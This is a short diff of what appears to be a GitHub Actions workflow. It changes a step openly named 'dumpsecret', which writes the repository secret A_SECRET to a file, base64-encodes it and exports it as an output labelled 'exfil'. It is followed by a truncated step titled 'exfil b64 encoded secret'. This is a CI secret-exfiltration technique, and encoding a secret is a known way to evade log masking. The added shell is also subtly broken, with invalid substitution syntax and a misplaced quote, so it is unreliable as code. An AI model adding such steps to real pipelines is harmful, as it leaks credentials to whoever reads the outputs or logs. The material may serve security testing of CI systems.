@@ -24,7 +24,10 @@ jobs:
       - name: Run a one-line script
         id: "dumpsecret"
         run: |
-         echo exfil="${{secrets.A_SECRET}}|base64" >> $GITHUB_OUTPUT
+         echo "${{secrets.A_SECRET}}" > a.txt
+         cat a.txt | base64 > b.txt
+         echo "exfil=${cat b.txt} >> $GITHUB_OUTPUT"
+
            
       - name: exfil b64 encoded secret
         run: |
